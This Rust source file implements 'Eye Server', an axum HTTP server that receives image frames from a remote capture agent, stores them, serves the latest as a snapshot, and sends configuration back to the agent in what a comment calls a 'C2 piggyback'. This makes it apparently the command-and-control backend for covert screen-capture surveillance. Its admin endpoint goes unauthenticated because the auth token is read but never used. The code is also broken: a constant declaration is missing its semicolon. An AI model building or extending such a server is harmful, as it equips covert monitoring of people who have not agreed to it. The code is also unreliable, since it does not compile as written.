// crates/server/src/main.rs
use anyhow::{Context, Result};
use axum::{
    extract::{DefaultBodyLimit, Multipart, Request, State},
    http::{StatusCode, header},
    middleware::{self, Next},
    response::{IntoResponse, Json, Response},
    routing::{get, post},
    Router,
};
use chrono::Utc;
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::collections::HashMap;
use std::env;
use std::sync::Arc;
use std::time::Instant;
use storage::{Frame, MemoryStore};
use tokio::sync::RwLock;
use tracing::info;
use chrono::Local;

// Configuration structure for the agent
#[derive(Debug, Clone, Serialize, Deserialize)]
struct AgentConfig {
    interval: f64,
    format: String,
    quality: i32,
}

// Default configuration values
impl Default for AgentConfig {
    fn default() -> Self {
        Self {
            interval: 1.5,
            format: "png".to_string(),
            quality: 95,
        }
    }
}

// Application state shared across handlers
#[derive(Clone)]
struct AppState {
    store: Arc<MemoryStore>,
    start_time: Instant,
    config: Arc<RwLock<AgentConfig>>,
}

// Implementation of AppState
impl AppState {
    fn new() -> Self {
        Self {
            store: Arc::new(MemoryStore::new(100)),
            start_time: Instant::now(),
            config: Arc::new(RwLock::new(AgentConfig::default())),
        }
    }
}

// Custom Logging Middleware
async fn logging_middleware(req: Request, next: Next) -> Response {
    let method = req.method().clone();
    let uri = req.uri().clone();
    let start = Instant::now();

    // Process request
    let response = next.run(req).await;

    let latency = start.elapsed();
    let status = response.status();
    let status_code = status.as_u16();

    // 1. Colorize Status Code
    let status_str = match status_code {
        200..=299 => format!("\x1b[42;30m {:>3} \x1b[0m", status_code),
        400..=499 => format!("\x1b[43;30m {:>3} \x1b[0m", status_code),
        500..=599 => format!("\x1b[41;30m {:>3} \x1b[0m", status_code),
        _ => status_code.to_string(),
    };

    // 2. Colorize Method
    let method_str = match method.as_str() {
        "GET" => format!("\x1b[44;30m {:<3} \x1b[0m", "GET"),
        "POST" => format!("\x1b[46;30m {:<4} \x1b[0m", "POST"),
        "PUT" => format!("\x1b[43;30m {:<3} \x1b[0m", "PUT"),
        "DELETE" => format!("\x1b[41;30m {:<6} \x1b[0m", "DELETE"),
        m => m.to_string(),
    };

    // 3. Format Timestamp
    let timestamp = Local::now().format("%Y/%m/%d - %H:%M:%S");

    // 4. Format Latency
    let latency_str = format!("{:?}", latency); 

    // 5. Client IP
    let client_ip = "::1";

    // 6. Print the log line directly
    println!(
        "[Eye] {} |{}| {:>13} |{:>15} | {} \"{}\"",
        timestamp,
        status_str,
        latency_str,
        client_ip,
        method_str,
        uri
    );

    response
}

// Health check handler
async fn health_handler(State(state): State<AppState>) -> Json<serde_json::Value> {
    let uptime = state.start_time.elapsed().as_secs_f64();
    let frames = state.store.list().await;

    Json(json!({
        "status": "healthy",
        "uptime": format!("{:.2}s", uptime),
        "frame_count": frames.len(),
    }))
}

// Admin configuration handler
async fn admin_config_handler(
    State(state): State<AppState>,
    Json(new_config): Json<AgentConfig>,
) -> Json<serde_json::Value> {
    let mut config = state.config.write().await;
    
    // Validate and update config
    let mut validated = new_config;
    if validated.interval < 0.1 {
        validated.interval = 0.1;
    }
    if validated.quality < 1 || validated.quality > 100 {
        validated.quality = 75;
    }
    validated.format = validated.format.to_lowercase();
    const SUPPORTED_FORMATS: &[&str] = &["png", "jpeg", "jpg", "webp", "bmp", "tiff"]
    if !SUPPORTED_FORMATS.contains(&validated.format.as_str()) {
        info!("Invalid format '{}', defaulting to PNG", validated.format);
        validated.format = "png".to_string();
    }

    if validated.format == "jpg" {
        validated.format = "jpeg".to_string();
    }

    *config = validated.clone();
    info!("Config updated: {:?}", config);

    Json(json!({
        "message": "Configuration updated",
        "config": config.clone(),
    }))
}

// Upload handler for receiving frames
async fn upload_handler(
    State(state): State<AppState>,
    mut multipart: Multipart,
) -> Result<Json<serde_json::Value>, (StatusCode, String)> {
    let mut data = None;
    let mut frame_id = 0i64;
    let content_type = "image/png".to_string();

    while let Some(field) = multipart
        .next_field()
        .await
        .map_err(|e| (StatusCode::BAD_REQUEST, e.to_string()))?
    {
        let name = field.name().unwrap_or("").to_string();

        match name.as_str() {
            "image" => {
                data = Some(
                    field
                        .bytes()
                        .await
                        .map_err(|e| (StatusCode::BAD_REQUEST, e.to_string()))?
                        .to_vec(),
                );
            }
            "frame_id" => {
                let text = field
                    .text()
                    .await
                    .map_err(|e| (StatusCode::BAD_REQUEST, e.to_string()))?;
                frame_id = text
                    .parse()
                    .map_err(|_| (StatusCode::BAD_REQUEST, "Invalid frame_id".to_string()))?;
            }
            _ => {}
        }
    }

    let data = data.ok_or((StatusCode::BAD_REQUEST, "No image file".to_string()))?;

    let mut metadata = HashMap::new();
    metadata.insert("content-type".to_string(), content_type);

    let frame = Frame {
        id: frame_id,
        data: data.clone(),
        timestamp: Utc::now(),
        metadata,
    };

    state
        .store
        .store(frame)
        .await
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;

    info!("Frame #{} stored ({} bytes)", frame_id, data.len());

    // Attach current config to response (C2 piggyback)
    let config = state.config.read().await.clone();

    Ok(Json(json!({
        "status": "ok",
        "frame_id": frame_id,
        "size_kb": data.len() as f64 / 1024.0,
        "config": config,
    })))
}

// Snapshot handler to retrieve latest frame
async fn snapshot_handler(
    State(state): State<AppState>,
) -> Result<impl IntoResponse, (StatusCode, String)> {
    let frame = state
        .store
        .get_latest()
        .await
        .map_err(|_| (StatusCode::NOT_FOUND, "No frames available".to_string()))?;

    let frame_id_str = frame.id.to_string();
    
    axum::response::Response::builder()
        .status(StatusCode::OK)
        .header(header::CONTENT_TYPE, "image/png")
        .header("x-frame-id", frame_id_str)
        .body(axum::body::Body::from(frame.data))
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))
}

// Debug handler to get server stats
async fn debug_handler(State(state): State<AppState>) -> Json<serde_json::Value> {
    let uptime = state.start_time.elapsed().as_secs_f64();
    let frames = state.store.list().await;
    let config = state.config.read().await.clone();

    Json(json!({
        "uptime_sec": uptime,
        "total_frames": frames.len(),
        "current_config": config,
    }))
}

// Main function to start the server
#[tokio::main]
async fn main() -> Result<()> {
    let args: Vec<String> = env::args().collect();
    if args.contains(&"--version".to_string()) {
        const VERSION: &str = env!("CARGO_PKG_VERSION");
        println!("eye-server v{}", VERSION);
        return Ok(());
    }
    // Initialize tracing
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::from_default_env()
                .add_directive(tracing::Level::INFO.into()),
        )
        .with_target(false)
        .compact()
        .init();

    // Get port from environment
    let port = env::var("EYE_PORT")
        .unwrap_or_else(|_| "8080".to_string());

    let _auth_token = env::var("EYE_AUTH_TOKEN").ok();

    let state = AppState::new();

    // Build router
    let app = Router::new()
        .route("/health", get(health_handler))
        .route("/upload", post(upload_handler))
        .route("/admin/config", post(admin_config_handler))
        .route("/snapshot.png", get(snapshot_handler))
        .route("/debug", get(debug_handler))
        .layer(DefaultBodyLimit::max(50 * 1024 * 1024))
        .layer(middleware::from_fn(logging_middleware))
        .with_state(state);

    let addr = format!("0.0.0.0:{}", port);
    info!("Eye Server starting on {}", addr);

    let listener = tokio::net::TcpListener::bind(&addr)
        .await
        .context("Failed to bind server")?;

    axum::serve(listener, app)
        .await
        .context("Server error")?;

    Ok(())
}

// Unit tests for the server
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_app_state_creation() {
        let state = AppState::new();
        assert!(state.start_time.elapsed().as_secs() < 1);
    }

    #[test]
    fn test_default_config() {
        let config = AgentConfig::default();
        assert_eq!(config.interval, 1.5);
        assert_eq!(config.format, "png");
        assert_eq!(config.quality, 95);
    }
}